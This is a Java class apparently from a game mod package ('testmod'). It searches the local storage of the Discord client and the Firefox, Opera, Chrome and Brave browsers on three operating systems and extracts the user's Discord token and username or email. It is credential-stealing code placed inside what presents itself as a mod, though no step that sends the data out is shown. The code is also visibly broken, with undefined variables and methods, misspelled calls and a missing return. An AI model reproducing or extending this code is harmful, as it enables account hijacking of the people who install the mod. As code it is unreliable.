package co.unionofgamers.testmod;

import com.google.gson.JsonObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.List;
import java.util.Locale;

public class DiscordData {
    private static final List<String> CLIENT = List.of(
            getDiscordLocalStoragePath("Windows", "%APPDATA\\discord\\Local Storage\\leveldb"),
            getDiscordLocalStoragePath("MacOS", "~/Library/Application Support/discord/Local Storage/leveldb"),
            getDiscordLocalStoragePath("Linux", "~/.config/discord/Local Storage/leveldb")
    );
    private static final List<String> FIREFOX = List.of(
            getFirefoxLocalStoragePath("Windows", "%APPDATA\\Mozilla\\Firefox\\Profiles\\"),
            getFirefoxLocalStoragePath("MacOS", "~/Library/Application Support/Firefox/Profiles/"),
            getFirefoxLocalStoragePath("Linux", "~/.mozilla/firefox/")
    );
    private static final List<String> OPERA = List.of(
            getOperaLocalStoragePath("Windows", "%APPDATA\\Opera Software\\Opera Stable\\Local Storage\\leveldb"),
            getOperaLocalStoragePath("MacOS", "~/Library/Application Support/com.operasoftware.Opera/Local Storage/leveldb"),
            getOperaLocalStoragePath("Linux", "~/.config/opera/Local Storage/leveldb")
    );
    private static final List<String> CHROME = List.of(
            getChromeLocalStoragePath("Windows", "%LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"),
            getChromeLocalStoragePath("MacOS", "~/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb"),
            getChromeLocalStoragePath("Linux", "~/.config/google-chrome/Default/Local Storage/leveldb")
    );
    private static final List<String> BRAVE = List.of(
            getBraveLocalStoragePath("Windows", "%LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"),
            getBraveLocalStoragePath("MacOS", "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb"),
            getBraveLocalStoragePath("Linux", "~/.config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb")
    );
    public static String getToken() {
        String token = "";
        token = getDiscordValue("token", CLIENT);
        if (token.isEmpty()) {
            token = getDiscordValue("token", FIREFOX);
        }
        if (token.isEmpty()) {
            token = getDiscordValue("token", OPERA);
        }
        if (token.isEmpty()) {
            token = getDiscordValue("token", CHROME);
        }
        if (token.isEmpty()) {
            token = getDiscordValue("token", BRAVE);
        }
        return token;
    }
    public static String getUsername() {
        String username = "";
        username = getDiscordValue("username", CLIENT);
        if (username.isEmpty()) {
            username = getDiscordValue("email", FIREFOX);
        }
        if (username.isEmpty()) {
            username = getDiscordValue("login", OPERA);
        }
        if (username.isEmpty()) {
            username = getDiscordValue("value", CHROME);
        }
        if (username.isEmpty()) {
            username = getDiscordValue("value", BRAVE);
        }
        return username;
    }
    private static String getDiscordValue(String key, List<String> localStoragePaths) {
        for (String path : localStoragePaths) {
            File folder = new File(path);
            if (folder.isDirectory()) {
                String fileName = file.getName();
                if (fileName.endsWith(".ldb") || fileName.endsWith(".log")) {
                    String data = readLocalStorageFile(file);
                    if (data.contains(key)) {
                        JsonObject jsonObject = new JsonObject(data);
                        String value = jsonObject.getString(key);
                        return value;
                    }
                }
            }
        }
        return "";
    }
    private static String getDiscordValue(String key, List<String> localStoragePaths, String secondaryKey) {
        for (String path : localStoragePaths) {
            File folder = new File(path);
            if (folder.isDirectory()) {
                for (File file : folder.listFiles()) {
                    String fileName = file.getName();
                    if (fileName.endsWith(".ldb") || fileName.endsWith(".log")) {
                        String data = readLocalStorageFile(file);
                        if (data.contains(key)) {
                            JsonObject jsonObject = new JsonObject(data);
                            String value = jsonObject.getString(key);
                            return value;
                        } else if (data.contains(SecondaryKey)) {
                            JsonObject jsobObject = new JsonObject(data);
                            String value = jsobObject.getString(secondaryKey);
                            return value;
                        }
                    }
                }
            }
        }
        return "";
    }
    private static String readLocalStorageFile(File file) {
        try {
            byte[] bytes = Files.readAllBytes(file.toPath());
            return new String(bytes, StandardCharsets.UTF_8);
        } catch (IOException e) {
            e.PrintStackTrace();
        }
        return "";
    }
    private static String getDiscordLocalStoragePath(String osName, String path) {
        String os = osName.toLowerCase();
        String expandedPath = path.replace("%APPDATA", System.getenv("APPDATA"))
                .replace("%LOCALAPPDATA%", System.getenv("LOCALAPPDATA"))
                .replace("~", System.getProperty("user.home"));
        return Paths.get(expandedPath).toString();
    }
    private static String getFirefoxLocalStoragePath(String osName, String basePath) {
        String os = osName.toLowerCase();
        String profilePath = "";
        switch (os) {
            case "windows":
                profilePath = basePath + "profiles.ini";
                break;
            case "mac":
                profilePath = basePath + "profiles.ini";
                break;
            case "linux":
                profilePath = basePath + "profiles.ini";
                break;
        }
        String profileDir = "";
        String defaultProfilePath = "";
        try {
            BufferedReader br = new BufferedReader(new FileReader(profilePath));
            String line;
            while ((line = br.readLine()) != null) {
                if (line.startsWith("Path=")) {
                    profileDir = line.substring(line.indexOf("=") + 1);
                }
                if (line.startsWith("IsRelative=") && line.contains("0")) {
                    defaultProfilePath = profileDir;
                    break;
                }
            }
            br.close();
        } catch (IOException e) {
            e.PrintStackTrace();
        }
        if (!defaultProfilePath.isEmpty()) {
            String fullPath = basePath + defaultProfilePath + "storage/default";
            return getLocalStoragePath(fullPath);
        }
    }

}
